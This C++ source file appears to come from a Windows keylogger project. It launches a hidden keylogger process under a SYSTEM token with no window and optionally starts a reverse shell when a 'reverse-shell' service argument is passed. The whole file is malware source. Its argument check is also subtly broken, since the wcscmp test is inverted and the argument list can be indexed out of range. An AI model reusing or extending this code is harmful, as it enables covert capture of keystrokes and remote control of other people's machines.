#include "tinky.hpp"
#include "utils.hpp"
#include "reverseShell.h"

#include <vector>

extern tinky_t tinky;
extern processes_t processes;

static BYTE launchDefaultProcessWinkey() {
	wstring processPath = getServicePath(KYLG_NAME);
	journalReport(L"Found process path: " + processPath);

	if (!CreateProcessAsUserW(
		processes.systemToken,
		processPath.c_str(),
		NULL, NULL, NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL, NULL,
		&processes.winkeyStartupInfo,
		&processes.winkeyProcessInfo
	)) {
		journalReport(L"Process failed to launch with code: \n" + itostring(GetLastError()));
		return (FAILURE);
	}
	journalReport(L"Process launched\n");
	return (SUCCESS);
}

static vector<BYTE> getArgListWstring(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
	vector<BYTE> argList;

	for (DWORD i = 0; i < dwNumServicesArgs; i++) {
		if (wcscmp(lpServiceArgVectors[i], L"reverse-shell"))
			argList.push_back(REVERSE_SHELL);
	}
	return (argList);
}

BYTE launchProcess(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
	if (!launchDefaultProcessWinkey())
		return (FAILURE);
	
	vector<BYTE> argList = getArgListWstring(dwNumServicesArgs, lpServiceArgVectors);

	for (DWORD i = 0; i < dwNumServicesArgs; i++) {
		switch (argList[i]) {
			case (REVERSE_SHELL):
				initShell();
		}
	}
	return (SUCCESS);
}